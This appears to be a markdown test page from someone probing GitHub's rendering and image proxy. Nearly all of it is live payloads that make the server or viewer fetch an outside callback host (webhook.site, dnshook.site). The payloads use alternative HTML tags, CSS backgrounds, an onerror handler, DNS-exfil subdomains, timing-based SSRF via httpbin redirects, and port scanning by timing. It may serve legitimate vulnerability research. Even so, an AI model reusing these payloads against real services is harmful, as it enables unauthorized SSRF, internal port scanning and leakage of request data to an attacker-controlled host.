# Security Research - v22

## Alternative HTML Element Testing

Testing if GitHub processes non-img tags differently.

### Picture Element with Srcset
<picture>
  <source srcset="https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/picture-source.gif" media="(min-width: 800px)">
  <img src="https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/picture-img.gif" alt="v22-picture">
</picture>

### Video Poster
<video poster="https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/video-poster.gif" width="1" height="1">
  <source src="https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/video-source.gif" type="video/mp4">
</video>

### Audio with Image
<audio controls poster="https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/audio-poster.gif"></audio>

### Object Tag
<object data="https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/object-data.gif" type="image/gif" width="1" height="1"></object>

### Embed Tag
<embed src="https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/embed-src.gif" type="image/gif" width="1" height="1">

### Background Styles (CSS)
<div style="background-image: url('https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/bg-style.gif'); width:1px; height:1px;"></div>

<span style="background: url(https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/span-bg.gif)">x</span>

### Input Image Type
<input type="image" src="https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/input-image.gif" width="1" height="1">

### Button with Background
<button style="background-image: url('https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/button-bg.gif');">.</button>

### Link Preload (may not render)
<link rel="preload" href="https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/link-preload.gif" as="image">

### SVG Image
<svg width="1" height="1">
  <image href="https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/svg-image.gif" width="1" height="1"/>
</svg>

### SVG Use External
<svg width="1" height="1">
  <use href="https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/svg-use.svg#test"></use>
</svg>

---

## Standard Markdown Images (Control)

### Basic Markdown
![v22-md-basic](https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/md-basic.gif)

### HTML IMG
<img src="https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/html-img.gif" alt="v22-html">

---

## Timing-Based SSRF Endpoints

Testing slow endpoints vs fast endpoints:

### Slow Response (httpbin delay)
![slow-5s](https://httpbin.org/delay/5)

### Redirect Chain with Delay
![redirect-delay](https://httpbin.org/redirect-to?url=https://httpbin.org/delay/3?callback=https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/timing-redirect.gif)

### Streaming Response
![stream](https://httpbin.org/stream-bytes/1024)

---

## Port Scan via Timing

Different ports may have different timeout behaviors:

![port-22](https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34:22/port-22.gif)
![port-443](https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34:443/port-443.gif)
![port-8080](https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34:8080/port-8080.gif)
![port-3306](https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34:3306/port-3306.gif)

---

## DNS Exfil via HTML Attributes

<img src="https://v22-html-test.7b02b6cc-0725-4212-96f5-82129a2e0e34.dnshook.site/dns.gif" onerror="this.src='https://v22-onerror.7b02b6cc-0725-4212-96f5-82129a2e0e34.dnshook.site/onerror.gif'">

<img srcset="https://v22-srcset.7b02b6cc-0725-4212-96f5-82129a2e0e34.dnshook.site/srcset.gif 1x, https://v22-srcset-2x.7b02b6cc-0725-4212-96f5-82129a2e0e34.dnshook.site/srcset2x.gif 2x" src="https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/srcset-fallback.gif">

---

## GitHub-Specific Features

### Issue/PR References with Images
See #1 for details.

### Emoji Proxy Test
:octocat: ![emoji-test](https://github.githubassets.com/images/icons/emoji/octocat.png)

### GitHub User Avatar
![avatar](https://avatars.githubusercontent.com/u/1?v=4)

---

## Canary
![v22-canary](https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/v22-canary.gif)

---

*v22 - Alternative HTML elements and timing tests*
